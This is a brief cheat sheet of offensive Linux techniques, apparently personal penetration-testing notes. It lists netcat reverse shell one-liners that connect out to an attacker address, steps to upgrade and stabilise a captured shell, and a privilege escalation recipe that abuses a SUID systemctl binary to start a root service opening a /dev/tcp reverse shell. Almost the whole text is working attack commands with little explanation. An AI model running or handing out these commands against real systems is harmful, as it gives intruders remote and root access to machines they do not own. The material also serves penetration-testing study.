# CyberCheatSheets
Reference Sheets / Notes of techniques learned

## Reverse Shells:

+ <b>Netcat - Listener</b>
```
$nc -nvlp 4242
```

+ <b>Netcat - Connecting to Listener</b>
```
nc -e /bin/sh 192.168.0.1 4242
```

+ <b>Netcat - Connecting to Listener without `-e`</b>
```
$mknod /tmp/backpipe p
$/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
```


## Upgrading/Stablizing Shells:

+ <b>Using Ptyhon</b>

*Upgrading:*
```
python -c ‘import pty;pty.spawn(“/bin/bash”)’
$export TERM=xterm
```

*Stablizing:*
```
$^Z
$stty raw -echo; fg
(ENTER)
```


## Privilege Escalation:

+ <b>`/bin/systemctl` SUID</b>

*Check if `/bin/systemcl` is exploitable*
```
find / -perm -4000 2>/dev/null
```

*Write service file with printf (will be written to `/tmp/root.service`)*
```
printf '[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/192.168.0.1/4242 0>&1"\n\n[Install]\nWantedBy=multi-user.target\n' > /tmp/root.service
```

*Enable and start the service*
```
systemctl enable /tmp/root.service
systemctl start root
```
